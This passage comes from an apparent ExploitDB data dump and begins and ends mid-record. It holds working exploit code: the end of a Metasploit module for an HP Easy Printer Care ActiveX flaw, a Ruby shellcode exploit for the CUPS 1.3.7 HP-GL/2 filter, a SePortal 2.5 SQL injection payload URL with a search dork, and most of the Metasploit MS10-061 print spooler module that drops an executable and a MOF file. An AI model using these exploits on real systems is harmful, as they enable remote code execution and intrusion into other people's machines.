\'win\',\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#Windows before Vista\r\n\t\t\t\t\t[ \'Automatic\', { } ],\r\n\t\t\t\t],\r\n\t\t\t\'DefaultTarget\'  => 0,\r\n\t\t\t\'DisclosureDate\' => \'Aug 16 2011\'))\r\n\tend\r\n\r\n\tdef on_request_uri(cli, request)\r\n\r\n\t\tunless request[\'User-Agent\'] =~ /MSIE/\r\n\t\t\tsend_not_found(cli)\r\n\t\t\tprint_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")\r\n\t\t\treturn\r\n\t\tend\r\n\r\n\t\t# Traversal directory attack calculated from default location:\r\n\t\t# C:\\Program Files\\Common Files\\Hewlett-Packard\\HP Device Communication Services\\TicketServices\r\n\r\n\t\t# Using Windows Management Instrumentation service to execute the payload.\r\n\t\t# Using code from "blackice_downloadimagefileurl.rb". See it for more information.\r\n\r\n\t\tvar_xml_data_union = rand_text_alpha(rand(5)+5)\r\n\t\tvar_xml_simple_accessor = rand_text_alpha(rand(5)+5)\r\n\t\tvar_mof_function_name = rand_text_alpha(rand(5)+5)\r\n\t\tvar_xml_tag = rand_text_alpha(rand(5)+5)\r\n\t\tvar_xml_content = rand_text_alpha(rand(5)+5)\r\n\r\n\t\tcontent = <<-EOS\r\n\t\t<html>\r\n\t\t<head>\r\n\t\t<script>\r\n\t\t\tvar #{var_xml_data_union} = new ActiveXObject(\'HPESPRIT.XMLDataUnion.1\');\r\n\t\t\tvar #{var_xml_simple_accessor} = new ActiveXObject(\'HPESPRIT.XMLSimpleAccessor.1\');\r\n\r\n\t\t\tfunction #{var_mof_function_name}() {\r\n\t\t\t\ttry {\r\n\t\t\t\t\t#{var_xml_data_union}.xml = "<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>";\r\n\t\t\t\t\t#{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};\r\n\t\t\t\t\t#{var_xml_data_union}.xml = unescape("#{@mof_content}");\r\n\t\t\t\t} catch( e ) {\r\n\t\t\t\t\t#{var_xml_simple_accessor}.SaveXML(\r\n\t\t\t\t\t\t"../../../../../WINDOWS/system32/wbem/mof/#{@var_mof_name}.mof",\r\n\t\t\t\t\t\t"UTF-8"\r\n\t\t\t\t\t);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttry {\r\n\t\t\t\t#{var_xml_data_union}.xml = "<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>";\r\n\t\t\t\t#{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};\r\n\t\t\t\t#{var_xml_data_union}.xml = unescape("#{@vbs_content}");\r\n\t\t\t} catch( e ) {\r\n\t\t\t\t#{var_xml_simple_accessor}.SaveXML(\r\n\t\t\t\t\t"../../../../../WINDOWS/system32/#{@var_vbs_name}.vbs",\r\n\t\t\t\t\t"UTF-8"\r\n\t\t\t\t);\r\n\t\t\t}\r\n\t\t\tsetTimeout("#{var_mof_function_name}()", 4000);\r\n\t\t</script>\r\n\t\t</head>\r\n\t\t</html>\r\n\t\tEOS\r\n\r\n\t\tprint_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")\r\n\t\tsend_response_html(cli, content)\r\n\t\thandler(cli)\r\n\tend\r\n\r\n\tdef exploit\r\n\t\t# In order to save binary data to the file system the payload is written to a .vbs\r\n\t\t# file and execute it from there.\r\n\t\t@var_mof_name = rand_text_alpha(rand(5)+5)\r\n\t\t@var_vbs_name = rand_text_alpha(rand(5)+5)\r\n\r\n\t\tprint_status("Encoding payload into vbs...")\r\n\t\tpayload = generate_payload_exe\r\n\t\t@vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))\r\n\r\n\t\tprint_status("Generating mof file...")\r\n\t\t@mof_content = Rex::Text.to_hex(generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs"))\r\n\t\tsuper\r\n\tend\r\n\r\nend', u'description': u'HP Easy Printer Care - XMLSimpleAccessor Class ActiveX Control Remote Code Execution (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-08-20T00:00:00+00:00', u'_id': 17697, u'type': u'remote', u'port': 0}

CVE: []
Description: CUPS 1.3.7 - 'HP-GL/2' Filter Remote Code Execution
{u'code': u'source: http://www.securityfocus.com/bid/31688/info\r\n\r\nCUPS is prone to a remote code-execution vulnerability caused by an error in the \'HP-GL/2 filter.\r\n\r\nAttackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely cause a denial-of-service condition. Note that local users may also exploit this vulnerability to elevate privileges.\r\n\r\nSuccessful remote exploits may require printer sharing to be enabled on the vulnerable system.\r\n\r\nThe issue affects versions prior to CUPS 1.3.9.\r\n\r\nNOTE: This issue was previously discussed in BID 31681 (Apple Mac OS X 2008-007 Multiple Security Vulnerabilities), but has been assigned its own record to better document the vulnerability. \r\n\r\n#!/usr/bin/ruby -w\r\n\r\n# CUPS 1.3.7 (HP-GL/2 filter) remote code execution\r\n# gives uid=2(daemon) gid=7(lp) groups=7(lp)\r\n# linux 2.6.25/randomize_va_space = 1, glibc 2.7\r\n#\r\n# An Introduction to HP-GL/2 Graphics\r\n# http://www.tech-diy.com/HP%20Graphics%20Language.htm\r\n# Internet Printing Protocol/1.1: Encoding and Transport\r\n# http://tools.ietf.org/html/rfc2910\r\n# Internet Printing Protocol/1.1: Model and Semantics\r\n# http://tools.ietf.org/html/rfc2911\r\n\r\n# :::::::::::::::::::::::::::::::::: setup ::::::::::::::::::::::::::::::::::\r\n\r\nhost = \'127.0.0.1\'\r\nport = 631\r\nprinter = \'Virtual_Printer\'\r\n\r\nPens_addr = 0x08073600\t\t# objdump -T hpgltops | grep Pens$\r\nfprintf_got = 0x080532cc\t# objdump -R hpgltops | grep fprintf\r\n\r\n# linux_ia32_exec - CMD=/bin/touch /tmp/yello Size=84, metasploit.com\r\n# encoder=PexFnstenvSub, restricted chars: 0xff\r\nshellcode =\r\n\t"\\x2b\\xc9\\x83\\xe9\\xf1\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x7c" +\r\n\t"\\x48\\x22\\xd6\\x83\\xeb\\xfc\\xe2\\xf4\\x16\\x43\\x7a\\x4f\\x2e\\x2e\\x4a\\xfb" +\r\n\t"\\x1f\\xc1\\xc5\\xbe\\x53\\x3b\\x4a\\xd6\\x14\\x67\\x40\\xbf\\x12\\xc1\\xc1\\x84" +\r\n\t"\\x94\\x5e\\x22\\xd6\\x7c\\x67\\x40\\xbf\\x12\\x67\\x56\\xb9\\x09\\x2b\\x4a\\xf6" +\r\n\t"\\x53\\x3c\\x4f\\xa6\\x53\\x31\\x47\\xba\\x10\\x27\\x22\\x81\\x2f\\xc1\\xc3\\x1b" +\r\n\t"\\xfc\\x48\\x22\\xd6";\r\n\r\n# :::::::::::::::::::::::::::::::::: code :::::::::::::::::::::::::::::::::::\r\n\r\n# beacause of hpgl-attr.c:68-73 and 269-274\r\ndef CR_setup()\r\n\t"CR0,1,0,1,0,1;"\r\nend\r\n\r\n# PS is a bit tricky here. final weight of pen (PW code) is calculated as:\r\n# weight*=hypot(ps[0],ps[1])/1016.0*72.0 (which is NOT hypot/73152.0),\r\n# where ps0=72.0*arg1/1016.0 and ps1=72.0*arg2/1016.0.\r\n# so, hoping to get things accurate I set multiplier to 1.0\r\ndef PS_setup()\r\n\t"WU1;" +\t\t# set the units used for pen widths\r\n\t"RO0;" +\t\t# (do not) rotate the plot\r\n\t"PS0,199.123455;";\t# set the plot size\r\nend\r\n\r\n# alternative approach to fight floating point rounding errors\r\n# first one seems to be more successful, though\r\ndef PS_setup_alt()\r\n\t"WU0;" +\r\n\t"RO0;";\r\nend\r\n\r\n# set the pen width (PS!)\r\ndef PW(width, pen)\r\n\t"PW#{width},#{pen};"\r\nend\r\n\r\ndef PW_alt(width, pen)\r\n\t"PW#{width*25.4/72.0},#{pen};"\r\nend\r\n\r\n# "Set the pen color..."\r\ndef PC(pen, r, g, b)\r\n\t"PC#{pen},#{r},#{g},#{b};"\r\nend\r\n\r\n# we\'ll be storing shellcode in Pens[1024] static buffer\r\n# typedef struct\r\n# {\r\n#   float rgb[3]; /* Pen color */\r\n#   float width;  /* Pen width */\r\n# } pen_t;\r\ndef memcpy(data)\r\n\twhile (data.length % 16 != 0)\r\n\t\tdata += "\\x90";\r\n\tend\r\n\ts = \'\'\r\n\ta = 0, b = 0, i = 0\r\n\tdata.unpack(\'f*\').each { |f|\r\n\t\tcase ((i += 1) % 4)\r\n\t\t\twhen 1: a = f\r\n\t\t\twhen 2: b = f\r\n\t\t\twhen 3: s += PC(i/4, a, b, f)\r\n\t\t\telse s += PW(f, (i-1)/4)\r\n\t\tend\r\n\t}\r\n\treturn s;\r\nend\r\n\r\n# overwrite all 16 bytes with the same value\r\ndef poke(addr, value)\r\n\tf = [value].pack(\'i\').unpack(\'f\')\t# floatyfication!\r\n\ti = (addr-Pens_addr)/16\r\n\treturn PC(i, f, f, f) + PW(f, i)\r\nend\r\n\r\nhpgl_data =\r\n\t"BP;" + # to be recognized by CUPS\r\n\tCR_setup() +\r\n\tPS_setup() +\r\n\tmemcpy(shellcode) +\r\n\tpoke(fprintf_got, Pens_addr) +\r\n\tPC(0, 0, 0, 0); # whatever\r\n\r\ndef attribute(tag, name, value)\r\n\t[tag].pack(\'C\') +\r\n\t[name.length].pack(\'n\') +\r\n\tname +\r\n\t[value.length].pack(\'n\') +\r\n\tvalue\r\nend\r\n\r\n# tag - meaning (rfc2910#section-3.5)\r\n# 0x42 nameWithoutLanguage\r\n# 0x45 uri\r\n# 0x47 charset\r\n# 0x48 naturalLanguage\r\noperation_attr =\r\n\tattribute(0x47, \'attributes-charset\', \'utf-8\') +\r\n\tattribute(0x48, \'attributes-natural-language\', \'en-us\') +\r\n\tattribute(0x45, \'printer-uri\', "http://#{host}:#{port}/printers/#{printer}") +\r\n\tattribute(0x42, \'job-name\', \'zee greeteengz\') +\r\n\tattribute(0x42, \'document-format\', \'application/vnd.hp-HPGL\');\r\n\r\nipp_data =\r\n\t"\\x01\\x00" +\t\t# version-number: 1.0\r\n\t"\\x00\\x02" +\t\t# operation-id: Print-job\r\n\t"\\x00\\x00\\x00\\x01" +\t# request-id: 1\r\n\t"\\x01" +\t\t# operation-attributes-tag\r\n\toperation_attr +\r\n\t"\\x02" +\t\t# job-attributes-tag\r\n\t"\\x03" +\t\t# end-of-attributes-tag\r\n\thpgl_data;\r\n\r\nhttp_request =\r\n"""POST /printers/#{printer} HTTP/1.1\r\nContent-Type: application/ipp\r\nUser-Agent: Internet Print Provider\r\nHost: #{host}\r\nContent-Length: #{ipp_data.length}\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n"""\r\n\r\nrequire \'socket\'\r\nNL = "\\r\\n"\r\n\r\nif (false)\r\n\t# ./hpgltops 0 none none 1 \'\' output.hpgl\r\n\tputs hpgl_data\r\n\tputs "[+] dumping HP/GL-2 into output.hpgl"\r\n\tf = File.new(\'output.hpgl\', \'w\')\r\n\tf.write(hpgl_data)\r\n\tf.close()\r\n\texit(0)\r\nend\r\n\r\nputs "[+] connecting to #{host}:#{port}"\r\ns = TCPSocket.open(host, port)\r\nputs "[+] asking #{printer} for a printout"\r\nhttp_request.each_line { |line|\r\n\ts.write(line.strip + NL)\r\n}\r\ns.write(NL)\r\ns.write(ipp_data)\r\ns.read(1)\r\ns.close()\r\nputs "[+] done"', u'description': u"CUPS 1.3.7 - 'HP-GL/2' Filter Remote Code Execution", u'platform': u'linux', u'author': u'regenrecht', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-10-09T00:00:00+00:00', u'_id': 32470, u'type': u'remote', u'port': 0}

CVE: []
Description: SePortal 2.5 - SQL Injection (2)
{u'code': u'####################################################################\r\nExploit: SePortal 2.5 Sql Injection Vulnerabilty\r\nAuthor: jsass\r\nDate  : 19\\03\\2014\r\nContact Twitter: @Kwsecurity\r\nScript: http://www.seportal.org/\r\nversion: 2.5\r\nTested on: Linux Ubuntu 12.4 & Windows 7\r\nDork : "Powered by SePortal 2.5"\r\n\r\n//** Searching And  Analysis By Kuwaity Crew **\\\\\r\n\r\n####################################################################\r\n      SQL INJECTION Vulnerabilty\r\n\r\n       code :\r\n $main_template = \'staticpages\';\r\n\r\ndefine(\'GET_CACHES\', 1);\r\ndefine(\'ROOT_PATH\', \'./\');\r\ndefine(\'GET_USER_ONLINE\', 1);\r\ndefine(\'GET_STATS_BOX\', 1);\r\ninclude(ROOT_PATH.\'global.php\');\r\nrequire(ROOT_PATH.\'includes/sessions.php\');\r\n\r\n  $sql = "SELECT *\r\n          FROM ".STATICPAGE_TABLE."\r\n          WHERE sp_id = \'".$sp_id."\'";\r\n  $result = $site_db->query($sql);\r\n\r\n      files:\r\n  staticpages.php?sp_id=(inject here)\r\n  print.php?mode=staticpage&client=printer&sp_id=(inject here)\r\n\r\nexample:\r\n\r\nhttp://localhost/seportal2.5/staticpages.php?sp_id=1%27%20%20and+extractvalue%28rand%28%29,concat%280x7e,version%28%29%29%29--%20-\r\n\r\n//////////////////////////////////////////////////////////////////////////////////\r\n     \r\n     \r\n               \r\n               \r\n Greats: dzkabyle & Mr.Exit & massacreur & rDNix & hamza & Q8 Spy & \u0627\u0644\u0634\u0628\u062d \u0627\u0644\u062f\u0645\u0648\u064a & medo medo & sec4ever.com & is-sec.com', u'description': u'SePortal 2.5 - SQL Injection (2)', u'platform': u'php', u'author': u'jsass', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-03-19T00:00:00+00:00', u'_id': 32359, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft Windows - Print Spooler Service Impersonation (MS10-061) (Metasploit)
{u'code': u'##\r\n# $Id: ms10_061_spoolss.rb 11766 2011-02-17 19:22:11Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\nrequire \'msf/windows_error\'\r\nrequire \'msf/core/exploit/wbemexec\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\r\n\tinclude Msf::Exploit::Remote::DCERPC\r\n\tinclude Msf::Exploit::Remote::SMB\r\n\tinclude Msf::Exploit::EXE\r\n\tinclude Msf::Exploit::WbemExec\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'Microsoft Print Spooler Service Impersonation Vulnerability\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\t\tThis module exploits the RPC service impersonation vulnerability detailed in\r\n\t\t\t\tMicrosoft Bulletin MS10-061. By making a specific DCE RPC request to the\r\n\t\t\t\tStartDocPrinter procedure, an attacker can impersonate the Printer Spooler service\r\n\t\t\t\tto create a file. The working directory at the time is %SystemRoot%\\\\system32.\r\n\t\t\t\tAn attacker can specify any file name, including directory traversal or full paths.\r\n\t\t\t\tBy sending WritePrinter requests, an attacker can fully control the content of\r\n\t\t\t\tthe created file.\r\n\r\n\t\t\t\tIn order to gain code execution, this module writes an EXE and then (ab)uses the\r\n\t\t\t\timpersonation vulnerability a second time to create a secondary RPC connection\r\n\t\t\t\tto the \\\\PIPE\\\\ATSVC named pipe. We then proceed to create a remote AT job using\r\n\t\t\t\ta blind NetrJobAdd RPC call.\r\n\t\t\t},\r\n\t\t\t\'Author\'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t\'jduck\',  # re-discovery, printer RPC stubs, module\r\n\t\t\t\t\t\'hdm\'     # ATSVC RPC proxy method, etc ;)\r\n\t\t\t\t],\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Version\'        => \'$Revision: 11766 $\',\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'OSVDB\', \'67988\' ],\r\n\t\t\t\t\t[ \'CVE\', \'2010-2729\' ],\r\n\t\t\t\t\t[ \'MSB\', \'MS10-061\' ]\r\n\t\t\t\t],\r\n\t\t\t\'Privileged\'     => true,\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'    => 1024,\r\n\t\t\t\t\t\'BadChars\' => "",\r\n\t\t\t\t\t\'DisableNops\' => true,\r\n\t\t\t\t},\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'Windows Universal\', { } ]\r\n\t\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \'Sep 14 2010\',\r\n\t\t\t\'DefaultTarget\' => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new(\'SMBPIPE\', [ false,  "The named pipe for the spooler service", "spoolss"]),\r\n\t\t\t\tOptString.new(\'PNAME\',   [ false,  "The printer share name to use on the target" ]),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect()\r\n\t\tlogin_time = Time.now\r\n\t\tsmb_login()\r\n\r\n\t\tprint_status("Trying target #{target.name}...")\r\n\r\n\t\thandle = dcerpc_handle(\'12345678-1234-abcd-EF00-0123456789ab\', \'1.0\', \'ncacn_np\', ["\\\\#{datastore[\'SMBPIPE\']}"])\r\n\r\n\t\tprint_status("Binding to #{handle} ...")\r\n\t\tdcerpc_bind(handle)\r\n\r\n\t\tprint_status("Bound to #{handle} ...")\r\n\r\n\t\t# Try all of the printers :)\r\n\t\tprinters = []\r\n\t\tif (pname = datastore[\'PNAME\'])\r\n\t\t\tprinters << pname\r\n\t\telse\r\n\t\t\tres = self.simple.client.trans(\r\n\t\t\t\t"\\\\PIPE\\\\LANMAN",\r\n\t\t\t\t(\r\n\t\t\t\t\t[0x00].pack(\'v\') +\r\n\t\t\t\t\t"WrLeh\\x00"   +\r\n\t\t\t\t\t"B13BWz\\x00"  +\r\n\t\t\t\t\t[0x01, 65406].pack("vv")\r\n\t\t\t\t)\r\n\t\t\t)\r\n\r\n\t\t\tprinters = []\r\n\r\n\t\t\tlerror, lconv, lentries, lcount = res[\'Payload\'].to_s[\r\n\t\t\t\tres[\'Payload\'].v[\'ParamOffset\'],\r\n\t\t\t\tres[\'Payload\'].v[\'ParamCount\']\r\n\t\t\t].unpack("v4")\r\n\r\n\t\t\tdata = res[\'Payload\'].to_s[\r\n\t\t\t\tres[\'Payload\'].v[\'DataOffset\'],\r\n\t\t\t\tres[\'Payload\'].v[\'DataCount\']\r\n\t\t\t]\r\n\r\n\t\t\t0.upto(lentries - 1) do |i|\r\n\t\t\t\tsname,tmp = data[(i * 20) +  0, 14].split("\\x00")\r\n\t\t\t\tstype     = data[(i * 20) + 14, 2].unpack(\'v\')[0]\r\n\t\t\t\tscoff     = data[(i * 20) + 16, 2].unpack(\'v\')[0]\r\n\t\t\t\tif ( lconv != 0)\r\n\t\t\t\t\tscoff -= lconv\r\n\t\t\t\tend\r\n\t\t\t\tscomm,tmp = data[scoff, data.length - scoff].split("\\x00")\r\n\r\n\t\t\t\t# we only want printers\r\n\t\t\t\tnext if stype != 1\r\n\r\n\t\t\t\tprinters << sname\r\n\t\t\tend\r\n\t\tend\r\n\r\n\t\t# Generate a payload EXE to execute\r\n\t\texe = generate_payload_exe\r\n\r\n\t\tprinters.each { |pr|\r\n\r\n\t\t\tpname = "\\\\\\\\#{rhost}\\\\#{pr}"\r\n\r\n\t\t\tprint_status("Attempting to exploit MS10-061 via #{pname} ...")\r\n\r\n\t\t\t# Open the printer\r\n\t\t\tstatus,ph = open_printer_ex(pname)\r\n\t\t\tif status != 0\r\n\t\t\t\traise RuntimeError, "Unable to open printer: #{Msf::WindowsError.description(status)}"\r\n\t\t\tend\r\n\t\t\tprint_status("Printer handle: %s" % ph.unpack(\'H*\'))\r\n\r\n\r\n\t\t\t# NOTE: fname can be anything nice to write to (cwd is system32), even\r\n\t\t\t# directory traversal and full paths are OK.\r\n\t\t\tfname = rand_text_alphanumeric(14) + ".exe"\r\n\t\t\twrite_file_contents(ph, fname, exe)\r\n\r\n\t\t\t# Generate a MOF file and write it so that the Windows Management Service will\r\n\t\t\t# execute our binary ;)\r\n\t\t\tmofname = rand_text_alphanumeric(14) + ".mof"\r\n\t\t\tmof = generate_mof(mofname, fname)\r\n\t\t\twrite_file_contents(ph, "wbem\\\\mof\\\\#{mofname}", mof)\r\n\r\n\t\t\t# ClosePrinter\r\n\t\t\tstatus,ph = close_printer(ph)\r\n\t\t\tif status != 0\r\n\t\t\t\traise RuntimeError, "Failed to close printer: #{Msf::WindowsError.description(status)}"\r\n\t\t\tend\r\n\r\n\t\t\tbreak if session_created?\r\n\t\t}\r\n\r\n\t\t#print_status("Everything should be set, waiting up to two minutes for a session...")\r\n\t\tprint_status("Everything should be set, waiting for a session...")\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\trescue ::Rex::Proto::SMB::Exceptions::ErrorCode, Rex::ConnectionError\r\n\t\traise RuntimeError, $!.message\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Use the vuln to write a file :)\r\n\t#\r\n\tdef write_file_contents(ph, fname, data)\r\n\r\n\t\tdoc = rand_text_alphanumeric(16+rand(16))\r\n\r\n\t\t# StartDocPrinter\r\n\t\tstatus,jobid = start_doc_printer(ph, doc, fname)\r\n\t\tif status != 0 or jobid < 0\r\n\t\t\traise RuntimeError, "Unable to start print job: #{Msf::WindowsError.description(status)}"\r\n\t\tend\r\n\t\tprint_status("Job started: 0x%x" % jobid)\r\n\r\n\t\t# WritePrinter\r\n\t\tstatus,wrote = write_printer(ph, data)\r\n\t\tif status != 0 or wrote != data.length\r\n\t\t\traise RuntimeError, (\'Failed to write %d bytes!\' % data.length)\r\n\t\tend\r\n\t\tprint_status("Wrote %d bytes to %%SystemRoot%%\\\\system32\\\\%s" % [data.length, fname])\r\n\r\n\t\t# EndDocPrinter\r\n\t\tstatus = end_doc_printer(ph)\r\n\t\tif status != 0\r\n\t\t\traise RuntimeError, "Failed to end print job: #{Msf::WindowsError.description(status)}"\r\n\t\tend\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Call RpcOpenPrinterEx\r\n\t#\r\n\tdef open_printer_ex(pname, machine = nil, user = nil)\r\n=begin\r\n\t\tDWORD RpcOpenPrinterEx(\r\n\t\t\t[in, string, unique] STRING_HANDLE pPrinterName,\r\n\t\t\t[out] PRINTER_HANDLE* pHandle,\r\n\t\t\t[in, string, unique] wchar_t* pDatatype,\r\n\t\t\t[in] DEVMODE_CONTAINER* pDevModeContainer,\r\n\t\t\t[in] DWORD AccessRequired,\r\n\t\t\t[in] SPLCLIENT_CONTAINER* pClientInfo\r\n\t\t);\r\n=end\r\n\r\n\t\t# NOTE: For more information about this encoding, see the following\r\n\t\t# sections of the Open Group\'s C706 DCE 1.1: RPC\r\n\t\t#\r\n\t\t# 14.3.8 Unions\r\n\t\t# 14.3.10 Pointers\r\n\t\t# 14.3.12.3 Algorithm for Deferral of Referents\r\n\t\t#\r\n\t\tmachine ||= \'\'\r\n\t\tmachine = NDR.uwstring(machine)\r\n\t\tuser ||= \'\'\r\n\t\tuser = NDR.uwstring(user)\r\n\r\n\t\tsplclient_info =\r\n\t\t\tNDR.long(0) +          # DWORD dwSize;\r\n\t\t\tmachine[0,4] +         # [string] wchar_t* pMachineName;\r\n\t\t\tuser[0,4] +            # [string] wchar_t* pUserName;\r\n\t\t\tNDR.long(7600) +       # DWORD dwBuildNum\r\n\t\t\tNDR.long(3) +          # DWORD dwMajorVersion;\r\n\t\t\tNDR.long(0) +          # DWORD dwMinorVersion;\r\n\t\t\tNDR.long(9)            # unsigned short wProcessorArchitecture;\r\n\r\n\t\t# Add the deferred members\r\n\t\tsplclient_info << machine[4, machine.length]\r\n\t\tsplclient_info << user[4, user.length]\r\n\r\n\t\tsplclient_info[0,4] = NDR.long(splclient_info.length)\r\n\r\n\t\tsplclient_info =\r\n\t\t\t# union!\r\n\t\t\tNDR.long(1) +        # discriminant (inside copy)\r\n\t\t\tNDR.long(rand(0xffffffff)) +\r\n\t\t\tsplclient_info\r\n\r\n\t\tstubdata =\r\n\t\t\tNDR.uwstring(pname) +  # pPrinterName\r\n\t\t\tNDR.long(0) +\r\n\t\t\t# DEVMODE_CONTAINER (null)\r\n\t\t\tNDR.long(0) +\r\n\t\t\tNDR.long(0) +\r\n\t\t\t# AccessRequired\r\n\t\t\tNDR.long(0x02020000) +\r\n\t\t\t# SPLCLIENT_CONTAINER\r\n\t\t\tNDR.long(1) + # Level (must be 1)\r\n\t\t\t# SPLCLIENT_INFO_1\r\n\t\t\tsplclient_info\r\n\r\n\t\t#print_status(\'Sending OpenPrinterEx request...\')\r\n\t\tresponse = dcerpc.call(69, stubdata)\r\n\t\tif (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\r\n\t\t\t#print_status("\\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\r\n\r\n\t\t\thandle = dcerpc.last_response.stub_data[0,20]\r\n\t\t\tstatus = dcerpc.last_response.stub_data[20,4].unpack(\'V\').first\r\n\r\n\t\t\treturn [status, handle]\r\n\t\tend\r\n\r\n\t\tnil\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Call RpcStartDocPrinter\r\n\t#\r\n\tdef start_doc_printer(handle, dname, fname, dtype = nil)\r\n=begin\r\n\t\ttypedef struct _DOC_INFO_CONTAINER {\r\n\t\t\tDWORD Level;\r\n\t\t\t[switch_is(Level)] union {\r\n\t\t\t\t[case(1)]\r\n\t\t\t\tDOC_INFO_1* pDocInfo1;\r\n\t\t\t} DocInfo;\r\n\t\t} DOC_INFO_CONTAINER;\r\n\t\tDWORD RpcStartDocPrinter(\r\n\t\t\t[in] PRINTER_HANDLE hPrinter,\r\n\t\t\t[in] DOC_INFO_CONTAINER* pDocInfoContainer,\r\n\t\t\t[out] DWORD* pJobId\r\n\t\t);\r\n=end\r\n\t\tdname = NDR.uwstring(dname)\r\n\t\tif fname\r\n\t\t\tfname = NDR.uwstring(fname)\r\n\t\telse\r\n\t\t\tfname = NDR.long(0)\r\n\t\tend\r\n\t\tif dtype\r\n\t\t\tdtype = NDR.uwstring(dtype)\r\n\t\telse\r\n\t\t\tdtype = NDR.long(0)\r\n\t\tend\r\n\r\n\t\tdoc_info =\r\n\t\t\tdname[0, 4] +\r\n\t\t\tfname[0, 4] +\r\n\t\t\tdtype[0, 4]\r\n\r\n\t\t# Add the deferred members\r\n\t\tdoc_info << dname[4, dname.length]\r\n\t\tdoc_info << fname[4, fname.length]\r\n\t\tdoc_info << dtype[4, dtype.length]\r\n\r\n\t\tdoc_info =\r\n\t\t\t# Union!\r\n\t\t\tNDR.long(1) +\r\n\t\t\tNDR.long(rand(0xffffffff)) +\r\n\t\t\tdoc_info\r\n\r\n\t\tstubdata =\r\n\t\t\thandle +\r\n\t\t\tNDR.long(1) +\r\n\t\t\tdoc_info\r\n\r\n\t\t#print_status(\'Sending StartDocPrinter request...\')\r\n\t\tresponse = dcerpc.call(17, stubdata)\r\n\t\tif (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\r\n\t\t\t#print_status("\\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\r\n\t\t\tjobid, status = dcerpc.last_response.stub_data.unpack(\'VV\')\r\n\t\t\treturn [status, jobid]\r\n\t\tend\r\n\r\n\t\tnil\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Call RpcWritePrinter\r\n\t#\r\n\tdef write_printer(handle, data)\r\n=begin\r\n\t\tDWORD RpcWritePrinter(\r\n\t\t\t[in] PRINTER_HANDLE hPrinter,\r\n\t\t\t[in, size_is(cbBuf)] BYTE* pBuf,\r\n\t\t\t[in] DWORD cbBuf,\r\n\t\t\t[out] DWORD* pcWritten\r\n\t\t);\r\n=end\r\n\t\tstubdata =\r\n\t\t\thandle +\r\n\t\t\tNDR.long(data.length) +\r\n\t\t\t# Perhaps we need a better data type for BYTE* :)\r\n\t\t\tdata +\r\n\t\t\tNDR.align(data) +\r\n\t\t\tNDR.long(data.length)\r\n\r\n\t\t#print_status(\'Sending WritePrinter request...\')\r\n\t\tresponse = dcerpc.call(19, stubdata)\r\n\t\tif (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\r\n\t\t\t#print_status("\\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\r\n\t\t\twrote,status = dcerpc.last_response.stub_data.unpack(\'VV\')\r\n\t\t\treturn [status, wrote]\r\n\t\tend\r\n\r\n\t\tnil\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Call RpcEndDocPrinter\r\n\t#\r\n\tdef end_doc_printer(handle)\r\n=begin\r\n\t\tDWORD RpcEndDocPrinter(\r\n\t\t\t[in] PRINTER_HANDLE* phPrinter\r\n\t\t);\r\n=end\r\n\r\n\t\t#print_status(\'Sending EndDocPrinter request...\')\r\n\t\tresponse = dcerpc.call(23, handle)\r\n\t\tif (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\r\n\t\t\t#print_status("\\n" + Rex::Text.to_hex_dump(dcerpc.last_response.stub_data))\r\n\t\t\tstatus = dcerpc.last_response.stub_data[0,4].unpack(\'V\').first\r\n\t\t\treturn status\r\n\t\tend\r\n\r\n\t\tnil\r\n\tend\r\n\r\n\r\n\t#\r\n\t# Call RpcClosePrinter\r\n\t#\r\n\tdef close_printer(handle)\r\n=begin\r\n\t\tDWORD RpcClosePrinter(\r\n\t\t\t[in, out] PRINTER_HANDLE* 